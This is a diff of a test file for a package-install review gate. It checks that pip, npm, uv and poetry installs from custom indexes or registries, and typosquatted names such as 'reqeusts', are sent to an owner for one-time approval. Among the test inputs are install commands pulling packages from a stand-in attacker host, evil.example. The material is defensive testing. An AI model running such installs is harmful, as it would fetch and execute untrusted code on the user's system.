@@ -40,18 +40,20 @@ test('parseInstall: names from pip/uv/poetry/npm/bun/yarn/pnpm/npx; versions and
 })
 
 test('parseInstall: manifests and sources the review cannot judge', () => {
-  expect(parseInstall('pip install -r requirements.txt')).toEqual({ pkgs: [], manifests: [{ eco: 'pypi', path: 'requirements.txt' }], unusual: [] })
+  expect(parseInstall('pip install -r requirements.txt')).toEqual({ pkgs: [], manifests: [{ eco: 'pypi', path: 'requirements.txt' }], unusual: [], custom: [] })
   expect(parseInstall('npm install')!.manifests).toEqual([{ eco: 'npm', path: 'package.json' }])
   expect(parseInstall('uv sync')!.manifests).toEqual([{ eco: 'pypi', path: 'pyproject.toml' }])
   expect(parseInstall('pip install git+https://github.com/x/y.git')!.unusual).toEqual(['git+https://github.com/x/y.git'])
-  expect(parseInstall('pip install --index-url https://evil.example/simple requests')!.unusual).toEqual(['index https://evil.example/simple'])
+  // a custom source: the packages are custom-source items, not registry packages
+  expect(parseInstall('pip install --index-url https://evil.example/simple requests')).toEqual({ pkgs: [], manifests: [], unusual: [], custom: ['requests (來源 https://evil.example/simple)'] })
+  expect(parseInstall('pip install -r req.txt -i https://pkgs.example/simple')!.manifests).toEqual([{ eco: 'pypi', path: 'req.txt', source: 'https://pkgs.example/simple' }])
   expect(parseInstall('pip install -e .')!.unusual).toEqual(['editable .'])
   expect(parseInstall('npm i ./local-pkg')!.unusual).toEqual(['./local-pkg'])
-  expect(parseInstall('npm i x --registry=https://evil.example')!.unusual).toEqual(['registry https://evil.example'])
+  expect(parseInstall('npm i x --registry=https://evil.example')!.custom).toEqual(['x (來源 https://evil.example)'])
 })
 
 test('parseInstall: an option\'s value is never a package (pip --only-binary :all:, npm --omit dev...); options that change the source make it a custom source; --with, --from, --spec, -p name packages', () => {
-  const p = (cmd: string) => { const r = parseInstall(cmd)!; return [...r.pkgs.map(x => `${x.eco}:${x.name}`), ...r.unusual.map(u => `other:${u}`)] }
+  const p = (cmd: string) => { const r = parseInstall(cmd)!; return [...r.pkgs.map(x => `${x.eco}:${x.name}`), ...r.unusual.map(u => `other:${u}`), ...r.custom.map(c => `custom:${c}`)] }
   expect(p('pip install --only-binary :all: --target pydeps hello-pypi-demo')).toEqual(['pypi:hello-pypi-demo'])
   expect(p('pip install --no-binary=:none: --progress-bar off --cache-dir /tmp/c --timeout 30 --upgrade-strategy eager rich')).toEqual(['pypi:rich'])
   expect(p('pip install -C editable_mode=compat --config-settings x=y --root-user-action ignore six')).toEqual(['pypi:six'])
@@ -62,14 +64,17 @@ test('parseInstall: an option\'s value is never a package (pip --only-binary :al
   expect(p('bun add --cwd web --backend copyfile lodash')).toEqual(['npm:lodash'])
   expect(p('npm i --omit=dev')).toEqual([])
   expect(parseInstall('npm i --omit dev')!.manifests).toEqual([{ eco: 'npm', path: 'package.json' }]) // no package named: package.json
-  // options that change where packages come from: the owner decides
-  expect(p('pip install --extra-index-url https://pkgs.example/simple foo')).toEqual(['pypi:foo', 'other:index https://pkgs.example/simple'])
-  expect(p('pip install -f ./wheels --trusted-host pkgs.example foo')).toEqual(['pypi:foo', 'other:index ./wheels', 'other:index pkgs.example'])
-  expect(p('uv add --default-index https://pkgs.example/simple foo')).toEqual(['pypi:foo', 'other:index https://pkgs.example/simple'])
-  expect(p('poetry add --source internal foo')).toEqual(['pypi:foo', 'other:index internal'])
-  expect(p('pipx install --pip-args="--index-url https://evil.example" foo')).toEqual(['pypi:foo', 'other:index --index-url https://evil.example'])
-  expect(p('npm i --userconfig ./npmrc x')).toEqual(['npm:x', 'other:registry ./npmrc'])
-  expect(p('npm i --@corp:registry=https://npm.corp.example @corp/ui')).toEqual(['npm:@corp/ui', 'other:registry https://npm.corp.example'])
+  // options that change where packages come from: every package of that install is a custom-source item
+  expect(p('pip install --index-url https://pypi.org/simple --target pydeps hello-pypi-demo')).toEqual(['custom:hello-pypi-demo (來源 https://pypi.org/simple)'])
+  expect(p('pip install --extra-index-url https://pkgs.example/simple foo bar==2')).toEqual(['custom:foo (來源 https://pkgs.example/simple)', 'custom:bar==2 (來源 https://pkgs.example/simple)'])
+  expect(p('pip install -f ./wheels --trusted-host pkgs.example foo')).toEqual(['custom:foo (來源 ./wheels, --trusted-host pkgs.example)'])
+  expect(p('uv add --default-index https://pkgs.example/simple foo')).toEqual(['custom:foo (來源 https://pkgs.example/simple)'])
+  expect(p('poetry add --source internal foo')).toEqual(['custom:foo (來源 --source internal)'])
+  expect(p('pipx install --pip-args="--index-url https://evil.example" foo')).toEqual(['custom:foo (來源 --pip-args --index-url https://evil.example)'])
+  expect(p('npm i --userconfig ./npmrc x')).toEqual(['custom:x (來源 --userconfig ./npmrc)'])
+  expect(p('npm i --@corp:registry=https://npm.corp.example @corp/ui')).toEqual(['custom:@corp/ui (來源 https://npm.corp.example)'])
+  // only the install that carries the option: the next one in the same line is a registry install
+  expect(p('pip install -i https://pkgs.example/simple foo && pip install requests')).toEqual(['pypi:requests', 'custom:foo (來源 https://pkgs.example/simple)'])
   // option values that are packages of their own
   expect(p('uvx --from httpie http GET example.com')).toEqual(['pypi:httpie'])
   expect(p('uvx --with rich --python 3.12 ruff check .')).toEqual(['pypi:rich', 'pypi:ruff'])
@@ -168,6 +173,36 @@ test('pkg gate: an option value is not sent for review nor written as an overrid
   expect(await gate.decide('pkg:1:once', ADMIN)).toBe('✅ 已允許一次')
   expect(db.listOverrides(conv.key).filter(o => o.kind === 'pkg').map(o => o.value)).toEqual(['pypi:hello-pypi-demo'])
   expect(await gate.check(conv, cmd)).toEqual({})
+})
+
+test('pkg gate: a custom source (--index-url...) is never looked up on PyPI, always goes to a person, and an approval lets that one install through without any override', async () => {
+  const review = judge({ reqeusts: 'high' })
+  const { conv, gate, sent, told } = harness(review)
+  const cmd = 'pip install --index-url https://pypi.org/simple --target pydeps hello-pypi-demo'
+  expect((await gate.check(conv, cmd)).reason).toBe('已送 owner 審核 (#1): hello-pypi-demo (來源 https://pypi.org/simple). 決定後會通知你, 到時再重新安裝')
+  expect(review.calls).toEqual([]) // not judged on PyPI facts
+  expect(sent[0]!.text).toContain('hello-pypi-demo (來源 https://pypi.org/simple) [自訂來源: 不查 PyPI/npm 的資料, 由人判斷]')
+  expect(sent[0]!.text).toContain('🔂 自訂來源的項目核准後只放行這一次安裝, 不寫進權限覆寫')
+  expect(sent[0]!.text).toContain('✅ 允許一次: 放行這一次安裝.')
+  expect(sent[0]!.text).not.toContain('♾️')
+  expect(sent[0]!.buttons).toEqual(['pkg:1:once', 'pkg:1:deny']) // nothing to allow for good
+  expect(await gate.decide('pkg:1:once', ADMIN)).toBe('✅ 已允許一次')
+  expect(db.listOverrides(conv.key).filter(o => o.kind === 'pkg')).toEqual([]) // no override
+  expect(told.at(-1)).toContain('自訂來源的項目只放行下一次同樣的安裝, 之後再裝要重新審核')
+  expect(await gate.check(conv, cmd)).toEqual({}) // that one install
+  expect((await gate.check(conv, cmd)).reason).toStartWith('已送 owner 審核 (#2)') // the next asks again
+  // with a registry package too: 永久允許 covers the registry, the custom source still passes once only
+  const mixed = 'pip install reqeusts && pip install -i https://pkgs.example/simple foo'
+  expect((await gate.check(conv, mixed)).reason).toBe('已送 owner 審核 (#3): pypi:reqeusts, foo (來源 https://pkgs.example/simple). 決定後會通知你, 到時再重新安裝')
+  expect(sent.at(-1)!.buttons).toEqual(['pkg:3:once', 'pkg:3:always', 'pkg:3:deny'])
+  expect(sent.at(-1)!.text).toContain('自訂來源的項目除外')
+  expect(await gate.decide('pkg:3:always', OWNER)).toBe('♾️ 已永久允許')
+  expect(db.listOverrides(conv.key).filter(o => o.kind === 'pkg').map(o => o.value).sort()).toEqual(['*', 'pypi:reqeusts'])
+  expect(await gate.check(conv, mixed)).toEqual({})
+  expect((await gate.check(conv, 'pip install -i https://pkgs.example/simple foo')).reason).toStartWith('已送 owner 審核 (#4): foo (來源 https://pkgs.example/simple)') // pkg * does not cover it
+  // a requirements file from a custom source: its packages are custom-source items
+  writeFileSync(join(conv.folder, 'req.txt'), 'six\n')
+  expect((await gate.check(conv, 'pip install -r req.txt --extra-index-url https://pkgs.example/simple')).reason).toContain('six (來源 https://pkgs.example/simple)')
 })
 
 test('pkg gate: a denial is reported and installs nothing new; a failed review counts as medium', async () => {
